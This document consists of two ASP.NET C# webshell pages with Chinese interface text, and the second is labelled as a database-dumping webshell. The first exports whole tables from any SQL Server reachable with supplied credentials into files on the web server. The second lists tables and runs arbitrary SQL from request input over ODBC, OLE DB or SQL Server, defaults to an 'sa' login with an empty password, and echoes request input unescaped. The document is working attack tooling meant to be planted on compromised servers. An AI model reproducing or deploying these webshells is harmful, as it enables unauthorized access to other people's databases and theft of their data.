<%@ Page Language=”C#” %>
 
<!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd“>
 
<script runat=”server”>
 
    protected void Button1_Click(object sender, EventArgs e)
     {
         string serverIP=txtServerIP.Text;
         string database=txtDatabase.Text;
         string user=txtUser.Text;
         string pass=txtPass.Text;
         string tableName=txtTableName.Text;
         string colName=txtColName.Text;
         string fileName=txtFileName.Text;
 
        if (serverIP != null & database != null & user != null & pass != null & tableName != null & fileName != null)
         {
 
             string connectionString = “server=”+serverIP+”;database=”+database+”;uid=”+user+”;pwd=”+pass;
             System.Data.SqlClient.SqlConnection connection = new System.Data.SqlClient.SqlConnection(connectionString);
 
            try
             {            
 
            connection.Open();
             string sqlStr = “select * from “+tableName;
 
            if (colName!=”")
             {
 
                sqlStr = “select ” + colName + ” from ” + tableName;             
 
            }
 
            System.Data.DataSet ds = new System.Data.DataSet();
             System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(sqlStr, connection);
             System.Data.SqlClient.SqlDataAdapter da = new System.Data.SqlClient.SqlDataAdapter(cmd);
             da.Fill(ds);
             System.Data.DataTable dataTable = ds.Tables[0];
 
            if (dataTable.Rows.Count==0)
             {
                 lblInfo.Text = “没有需要导出的数据！”;
                 lblInfo.ForeColor = System.Drawing.Color.Blue;
                 return;
 
            }
 
            string filePath = System.IO.Path.GetDirectoryName(Server.MapPath(“DataOutExl.aspx”))+”\\DataOut“;
             if (!System.IO.Directory.Exists(filePath))
             {
                 System.IO.Directory.CreateDirectory(filePath);
             }
             bool outType = RadioButton1.Checked;
             int sum = dataTable.Rows.Count;
             int count = 1;
             int size = 0;
             int tmpNum = 1;
 
            if (txtNum.Text!=”")
             {
                 size = int.Parse(txtNum.Text);
                 count = sum / size+1;
             }
 
            for (int z = 0; z < count; z++)
             {
 
            Button1.Text = “正在导出..”;
             Button1.Enabled = false;
             lblInfo.Text = “正在导出第”+(z+1)+”组数据，共”+count+”组数据”;
             lblInfo.ForeColor = System.Drawing.Color.Blue; 
 
            System.IO.StreamWriter file = new System.IO.StreamWriter(filePath+”\\” + (z+1) +”_”+fileName, false, Encoding.UTF8);
 
            bool isFirst = true;
             if (outType)
             {
 
            file.Write(@”<html><head><meta http-equiv=content-type content=’text/html; charset=UNICODE’>
                         <style>*{font-size:12px;}table{background:#DDD;border:solid 2px #CCC;}td{background:#FFF;}
                         .th td{background:#EEE;font-weight:bold;height:28px;color:#008;}
                         div{border:solid 1px #DDD;background:#FFF;padding:3px;color:#00B;}</style>
                         <title>Export Table</title></head><body>”);
 
            file.Write(“<table border=’0′ cellspacing=’1′ cellpadding=’3′>”);
 
            }
 
            for (int i = size*z; i < dataTable.Rows.Count; i++)
             {
                 System.Data.DataRow dataRow = dataTable.Rows[i];
                 if (isFirst)
                 {
                     if ( outType)
                     {
                         file.Write(“<tr class=’th’>”);
                     }
 
                    for (int j = 0; j < dataTable.Columns.Count; j++)
                     {
 
                        if (outType)
                         {
                             file.Write(“<td>”);
                         }
 
                        file.Write(dataTable.Columns[j].ColumnName + “     “);
 
                        if (outType)
                         {
                             file.Write(“</td>”);
                         }
                     }
 
                    if (outType)
                     {
                         file.Write(“</tr>”);
                     }
 
                    isFirst = false;
                 }
 
                if (outType)
                 {
                     file.Write(“<tr>”);
                 }
                 else
                 {
                     file.WriteLine(” “);
                 }
 
                for (int k = 0; k < dataTable.Columns.Count; k++)
                 {
 
                    if (outType)
                     {
                         file.Write(“<td>”);
                     }
 
                    file.Write(dataTable.Rows[i][k] + “     “);
 
                    if (outType)
                     {
                         file.Write(“</td>”);
                     }
                 }
 
                if (outType)
                 {
                     file.Write(“<tr>”);
                 }
                 else
                 {
                     file.WriteLine(” “);
                 }
 
                if (tmpNum==size)
                     break;
 
                tmpNum += 1;
 
            }
 
            if (outType)
             {
                 file.Write(“</table>”);
                 file.Write(“<br /><div>执行成功!返回” + tmpNum + “行</div>”);
                 file.Write(“</body></html>”);
             }
             else
             {
                 file.WriteLine(“执行成功!返回” + tmpNum + “行!”);
             }
 
            file.Dispose();
             file.Close();
             tmpNum = 1;
             }
 
            lblInfo.Text = “导出成功！”;
             lblInfo.ForeColor = System.Drawing.Color.Blue;
             Button1.Enabled = true;
             Button1.Text = “开始导出”;
 
            }
             catch (Exception ex)
             {
                 lblInfo.Text = “导出失败！” + ex.Message;
                 lblInfo.ForeColor = System.Drawing.Color.Red;
 
            }finally
             {
                 connection.Close();
             }
 
        }
         else
         {
             lblInfo.Text = “请先填写相关的连接信息！”;
             lblInfo.ForeColor = System.Drawing.Color.Red;
         }
     }
 </script>
 
<html xmlns=”http://www.w3.org/1999/xhtml“>
 <head runat=”server”>
     <title>无标题页</title>
     <style type=”text/css”>
         .style1
         {
             width: 61%;
         }
         .style2
         {
             height: 23px;
         }
     </style>
 </head>
 <body>
     <form id=”form1″ runat=”server”>
     <div>
 
        <table>
             <tr>
                 <td colspan=”2″ align=center>
                     SQL Server 数据导出&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                     友情链接:<a href=”http://hi.baidu.com/5427518“>情’Blog</a></td>
 
            </tr>
             <tr>
                 <td>
                     服务器IP:</td>
                 <td>
                     <asp:TextBox ID=”txtServerIP” runat=”server” Width=”172px”></asp:TextBox>
                     *</td>
             </tr>
             <tr>
                 <td>
                     数据库：</td>
                 <td>
                     <asp:TextBox ID=”txtDatabase” runat=”server” Width=”172px”></asp:TextBox>
                     *</td>
             </tr>
             <tr>
                 <td>
                     用户名：</td>
                 <td>
                     <asp:TextBox ID=”txtUser” runat=”server” Width=”172px”></asp:TextBox>
                     *</td>
             </tr>
             <tr>
                 <td>
                     密码：</td>
                 <td>
                     <asp:TextBox ID=”txtPass” runat=”server” Width=”172px”></asp:TextBox>
                     *</td>
             </tr>
             <tr>
                 <td>
                     表名：</td>
                 <td>
                     <asp:TextBox ID=”txtTableName” runat=”server” Width=”172px”></asp:TextBox>
                     *</td>
             </tr>
              <tr>
                 <td>
                     列名：</td>
                 <td>
                     <asp:TextBox ID=”txtColName” runat=”server” Width=”172px”></asp:TextBox>
                 &nbsp; 列名之间请用‘,’分开，不写代表全部</td>
             </tr>
              <tr>
                 <td>
                     分组行数：</td>
                 <td>
                     <asp:TextBox ID=”txtNum” runat=”server” Width=”172px”></asp:TextBox>
                     &nbsp; 对于数据多的时候可以使用</td>
             </tr>
             <tr>
                 <td>
                     保存文件名：</td>
                 <td>
                     <asp:TextBox ID=”txtFileName” runat=”server” Width=”172px”></asp:TextBox>
                     *</td>
             </tr>
             <tr>
                 <td>
                     文件格式：</td>
                 <td>
                     <asp:RadioButton ID=”RadioButton1″ runat=”server” GroupName=”type” Checked=”true” Text=”html” />
                     &nbsp; &nbsp; &nbsp; &nbsp;
                     <asp:RadioButton ID=”RadioButton2″ runat=”server” GroupName=”type” Text=”txt” />
                 </td>
             </tr>
              <tr>
                 <td colspan=”2″ align=”center”>
                     <asp:Button ID=”Button1″ runat=”server” Text=”开始导出” onclick=”Button1_Click” />
                  </td>
 
            </tr>
             <tr>
                 <td colspan=”2″>
                     <asp:Label ID=”lblInfo” runat=”server” Text=”"></asp:Label>
                     </td>
 
            </tr>
         </table>
 
    </div>
     </form>
 </body>
 </html>
 
 
 
=======================================================
 
 
 
 
 
 
 
 
 
 
 
涮库webshell之二：
 
<%@ Page Language=”C#” %>
 
<!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd“>
 
<script runat=”server”>
     protected void Page_Load(object sender, EventArgs e)
     {
         //if (Request["sub"] != null && Request["sub"] == “submit”)
         //{
         //    GridView1.Visible = true;
 
        //    //System.Web.HttpContext.Current.Response.Write(DropDownList1.SelectedIndex);
         //    if (DropDownList1.SelectedIndex == 0)
         //    {
         //        using (System.Data.Odbc.OdbcConnection conn = new System.Data.Odbc.OdbcConnection(Request["conn"]))
         //        {
         //            conn.Open();
         //            System.Data.Odbc.OdbcCommand comm = new System.Data.Odbc.OdbcCommand(Request["sql"], conn);
         //            System.Data.Odbc.OdbcDataAdapter ad = new System.Data.Odbc.OdbcDataAdapter();
         //            ad.SelectCommand = comm;
         //            System.Data.DataSet ds = new System.Data.DataSet();
         //            ad.Fill(ds);
         //            GridView1.DataSource = ds;
         //            GridView1.DataBind();
         //        }
         //    }
         //    if (DropDownList1.SelectedIndex == 2)
         //    {
         //        using (System.Data.SqlClient.SqlConnection conn = new System.Data.SqlClient.SqlConnection(Request["conn"]))
         //        {
         //            conn.Open();
         //            System.Data.SqlClient.SqlCommand comm = new System.Data.SqlClient.SqlCommand(Request["sql"], conn);
         //            System.Data.SqlClient.SqlDataAdapter ad = new System.Data.SqlClient.SqlDataAdapter();
         //            ad.SelectCommand = comm;
         //            System.Data.DataSet ds = new System.Data.DataSet();
         //            ad.Fill(ds);
         //            GridView1.DataSource = ds;
         //            GridView1.DataBind();
         //        }
 
        //    }
         //    if (DropDownList1.SelectedIndex == 1)
         //    {
         //        using (System.Data.OleDb.OleDbConnection conn = new System.Data.OleDb.OleDbConnection(Request["conn"]))
         //        {
         //            conn.Open();
         //            System.Data.OleDb.OleDbCommand comm = new System.Data.OleDb.OleDbCommand(Request["sql"], conn);
         //            System.Data.OleDb.OleDbDataAdapter ad = new System.Data.OleDb.OleDbDataAdapter();
         //            ad.SelectCommand = comm;
         //            System.Data.DataSet ds = new System.Data.DataSet();
         //            ad.Fill(ds);
         //            GridView1.DataSource = ds;
         //            GridView1.DataBind();
         //        }
         //    }
         //}
 
    }
 
protected void  DropDownList1_SelectedIndexChanged(object sender, EventArgs e)
 {
     connT.Text = DropDownList1.SelectedValue.ToString();
     GridView1.Visible = false;
     DropDownList2.Items.Clear();
 }
 
protected void Button1_Click(object sender, EventArgs e)
 
{
     if (DropDownList1.SelectedIndex == 0)
     {
         using (System.Data.Odbc.OdbcConnection conn = new System.Data.Odbc.OdbcConnection(connT.Text.ToString()))
         //using (System.Data.OleDb.OleDbConnection conn = new System.Data.OleDb.OleDbConnection(connT.Text.ToString()))
         {
             conn.Open();
             System.Data.DataTable dt = conn.GetSchema(“Tables”);
 
            //GridView1.DataSource = dt;
             //GridView1.DataBind();
             //GridView1.Visible = true;
             //DropDownList2.DataSource = dt.Select(“TABLE_TYPE=’TABLE’”);
             //DropDownList2.DataValueField = “TABLE_NAME”;
             //DropDownList2.DataTextField = “TABLE_NAME”;
             //DropDownList2.DataBind();
             DropDownList2.Items.Clear();
             foreach (System.Data.DataRow item in dt.Select(“TABLE_TYPE=’TABLE’”))
             {
 
                DropDownList2.Items.Add(new ListItem(item["TABLE_NAME"].ToString(), item["TABLE_NAME"].ToString()));
 
            }
         }
     }
     if (DropDownList1.SelectedIndex == 1)
     {
         using (System.Data.OleDb.OleDbConnection conn = new System.Data.OleDb.OleDbConnection(connT.Text.ToString()))
         {
             conn.Open();
             System.Data.DataTable dt = conn.GetSchema(“Tables”);
 
            //GridView1.DataSource = dt;
             //GridView1.DataBind();
             //GridView1.Visible = true;
             //DropDownList2.DataSource = dt.Select(“TABLE_TYPE=’TABLE’”);
             //DropDownList2.DataValueField = “TABLE_NAME”;
             //DropDownList2.DataTextField = “TABLE_NAME”;
             //DropDownList2.DataBind();
             DropDownList2.Items.Clear();
             foreach (System.Data.DataRow item in dt.Select(“TABLE_TYPE=’TABLE’”))
             {
 
                DropDownList2.Items.Add(new ListItem(item["TABLE_NAME"].ToString(), item["TABLE_NAME"].ToString()));
 
            }
         }
     }
     if (DropDownList1.SelectedIndex == 2)
     {
         using (System.Data.SqlClient.SqlConnection conn = new System.Data.SqlClient.SqlConnection(connT.Text.ToString()))
                 {
             conn.Open();
             System.Data.SqlClient.SqlCommand comm = new System.Data.SqlClient.SqlCommand(“select name from sysobjects where type=’U'”, conn);
             //System.Data.SqlClient.SqlDataReader dr = comm.ExecuteReader();
             //string UserTable = “”;
             //while (dr.Read())
             //{
             //    UserTable = (string)dr[0];
             //    DropDownList2.Items.Add(UserTable);
 
            //}
             System.Data.SqlClient.SqlDataAdapter ad = new System.Data.SqlClient.SqlDataAdapter();
             ad.SelectCommand = comm;
             System.Data.DataSet ds = new System.Data.DataSet();
             ad.Fill(ds);
 
            DropDownList2.DataSource = ds;
 
            DropDownList2.DataTextField = “name”;
             DropDownList2.DataValueField = “name”;
             DropDownList2.DataBind();
 
        }
     }
 }
 
protected void Button2_Click(object sender, EventArgs e)
 {
     string provoder = “”;
 
    if (DropDownList1.SelectedIndex == 1)
         provoder = “System.Data.OleDb”;
     else if (DropDownList1.SelectedIndex == 2)
 
        provoder = “System.Data.SqlClient”;
     else if (DropDownList1.SelectedIndex ==0)
     {
         provoder = “System.Data.Odbc”;
     }
 
    System.Data.Common.DbProviderFactory factory = System.Data.Common.DbProviderFactories.GetFactory(provoder);
     System.Data.Common.DbConnection conn=factory.CreateConnection() ;
     conn.ConnectionString = connT.Text;
     conn.Open();
     System.Data.Common.DbCommand comm = conn.CreateCommand();
     comm.CommandText = Request["sql"];
     System.Data.Common.DbDataReader dr= comm.ExecuteReader();
     GridView1.DataSource = dr;
     GridView1.DataBind();
     GridView1.Visible = true;
     dr.Close();
     comm.Dispose();
     conn.Close();
 
}
 </script>
 
<html xmlns=”http://www.w3.org/1999/xhtml“>
 <head runat=”server”>
     <title></title>
 
    <script language=”javascript” type=”text/javascript”>
 // <!CDATA[
 
        function Select1_onclick() {
             document.getElementById('conn').value = "dsn";
         }
 
// ]]>
     </script>
     <style type=”text/css”>
         #sql
         {
             width: 677px;
             height: 106px;
         }
     </style>
 </head>
 <body>
     <form id=”form1″ runat=”server”>
     <div>
         <table><tr><td >
     type:</td><td colspan=”2″><asp:DropDownList ID=”DropDownList1″ runat=”server”
             onselectedindexchanged=”DropDownList1_SelectedIndexChanged”
             AutoPostBack=”True”>
             <asp:ListItem Value=”dsn=;uid=;pwd=;”>dsn</asp:ListItem>
             <asp:ListItem Value=”Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb”>access</asp:ListItem>
             <asp:ListItem Value=”server=localhost;UID=sa;PWD=;database=master”>mssql</asp:ListItem>
         </asp:DropDownList>
         <br/></td>
         </tr>
 
        <tr><td>
         conn: </td><td><asp:TextBox ID=”connT” name=”conn” runat=”server” Width=”680px”></asp:TextBox></td><td>
             <asp:Button
                         ID=”Button1″ runat=”server” Text=”Go”
                 onclick=”Button1_Click” />
                     <br/>
         </td></tr>
         <tr><td>tables</td><td colspan=”2″>
             <asp:DropDownList ID=”DropDownList2″  runat=”server”>
             </asp:DropDownList>
         </td></tr>
         <tr><td>sqlstr:  </td><td><input type=”text” name=”sql” id=”sql”  value=”<% =Request["sql"]%>”/></td><td>
 
     <br />
             <asp:Button ID=”Button2″ runat=”server” onclick=”Button2_Click” Text=”Exec” />
             </td></tr>
         </table>
         <asp:GridView ID=”GridView1″ runat=”server” CellPadding=”4″ ForeColor=”#333333″
             GridLines=”None”>
             <RowStyle BackColor=”#EFF3FB” />
             <FooterStyle BackColor=”#507CD1″ Font-Bold=”True” ForeColor=”White” />
             <PagerStyle BackColor=”#2461BF” ForeColor=”White” HorizontalAlign=”Center” />
             <SelectedRowStyle BackColor=”#D1DDF1″ Font-Bold=”True” ForeColor=”#333333″ />
             <HeaderStyle BackColor=”#507CD1″ Font-Bold=”True” ForeColor=”White” />
             <EditRowStyle BackColor=”#2461BF” />
             <AlternatingRowStyle BackColor=”White” />
         </asp:GridView>
     </div>
     </form>
 </body>
 </html>
